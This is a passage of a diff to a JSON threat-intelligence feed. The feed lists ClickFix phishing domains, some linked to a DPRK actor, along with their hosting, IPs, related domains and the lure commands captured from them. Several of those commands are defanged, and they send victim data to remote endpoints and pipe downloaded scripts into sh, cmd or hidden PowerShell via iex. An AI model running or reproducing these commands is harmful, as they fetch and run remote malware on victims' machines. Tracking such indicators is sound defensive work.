-    "curl -sL -d \"id=b0d8cbc5-a0c2-4f40-9033-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fvantaiminhthanh.com.vn%2F&os=Mac%2015&lastVisitAt=2026-11-21T03%3A26%3A06.891Z&lastShellAt=2026-11-21T03%3A26%3A06.891Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//script-six-tawny[.]vercel[.]app/mac' -L | sh",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=23d6460b-165e-44b2-a226-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fvantaiminhthanh.com.vn%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-21T03%3A21%3A26.288Z\"\" -d \"\"lastShellAt=2026-11-21T03%3A21%3A26.288Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -fsSL hxxps[:]//script-six-tawny[.]vercel[.]app/win | cmd\""
+    "curl -sL -d \"id=9a443a27-f23b-4198-82df-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fvantaiminhthanh.com.vn%2F&os=Mac%2015&lastVisitAt=2026-11-28T00%3A03%3A20.690Z&lastShellAt=2026-11-28T00%3A03%3A20.690Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//script-six-tawny[.]vercel[.]app/mac' -L | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=32bba1ff-141d-4ff9-b922-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fvantaiminhthanh.com.vn%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-27T23%3A50%3A55.035Z\"\" -d \"\"lastShellAt=2026-11-27T23%3A50%3A55.035Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -fsSL hxxps[:]//script-six-tawny[.]vercel[.]app/win | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
    ],
    "lure_from": [
     "browse-cloud.codes",
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -325969,7 +325441,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "104.21.85.71",
+   "ip": "172.67.203.128",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -327172,65 +326644,6 @@
    ],
    "connects_to": [],
    "lure_from": []
-  },
-  {
-   "indicator": "vindhyacitynews.in",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Phishing page",
-   "status": "online",
-   "first_seen": "2026-11-15",
-   "last_seen": "2026-11-15",
-   "last_online": "2026-11-27",
-   "offline_since": null,
-   "url": "https://mail.vindhyacitynews.in/",
-   "brand": null,
-   "product": null,
-   "hosting": "WHG Hosting Services Ltd",
-   "dns": "mysecurecloudhost.com",
-   "ip": "209.42.28.16",
-   "asn": "AS199404",
-   "org": "WHG Hosting Services Ltd",
-   "country": "IN",
-   "ips": [
-    {
-     "ip": "209.42.28.16",
-     "asn": "AS199404",
-     "org": "WHG Hosting Services Ltd",
-     "first_seen": "2026-11-15",
-     "last_seen": "2026-11-15"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "mail.vindhyacitynews.in",
-     "status": "online",
-     "first_seen": "2026-11-15",
-     "last_seen": "2026-11-15"
-    },
-    {
-     "host": "vindhyacitynews.in",
-     "status": "online",
-     "first_seen": "2026-11-15",
-     "last_seen": "2026-11-15"
-    }
-   ],
-   "actor": "dprk",
-   "actor_link": "linked",
-   "commands": [
-    "curl -sL -d \"id=934404ab-edbc-4f68-827e-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fmail.vindhyacitynews.in%2F&os=Mac%2015&lastVisitAt=2026-11-15T19%3A21%3A57.265Z&lastShellAt=2026-11-15T19%3A21%3A57.265Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"hxxps[:]//softify[.]lat/u/8ecec3ba\" | sh",
-    "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=8001df15-eeb3-47a5-a0f9-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fmail.vindhyacitynews.in%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-15T19%3A11%3A25.604Z\"\" -d \"\"lastShellAt=2026-11-15T19%3A11%3A25.604Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\"\" & curl.exe -fsSL \"\"hxxps[:]//softify[.]lat/w/8ecec3ba\"\" | powershell\""
-   ],
-   "connects_to": [
-    "softify.lat",
-    "fingerprint-veri.info"
-   ],
-   "lure_from": [
-    "browse-cloud.codes"
-   ]
   },
   {
    "indicator": "vineblossom.it",
@@ -332361,14 +331774,14 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "j7tracker.gb.net",
     "t-trustresnew.com",
-    "trustchecknes.com",
-    "j7tracker.gb.net"
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -335584,11 +334997,11 @@
     "yellow-monkey.cfd",
     "efreitorher.org",
     "biboiboboorl.org",
+    "barabulkaaaa.org",
     "yaebalciganovvjopu.org",
     "pizdalisibivet.org",
     "yaponovosh.org",
-    "ciganshina.org",
-    "pakistanskimalchik.org"
+    "ciganshina.org"
    ]
   },
   {
@@ -343245,20 +342658,20 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "172.67.162.231",
+   "ip": "188.114.96.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
     {
-     "ip": "172.67.162.231",
+     "ip": "104.21.74.209",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-27",
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "104.21.74.209",
+     "ip": "172.67.162.231",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-27",
@@ -345977,7 +345390,8 @@
    ],
    "lure_from": [
     "img-codes-cloude.info",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "browse-login.info"
    ]
   },
   {
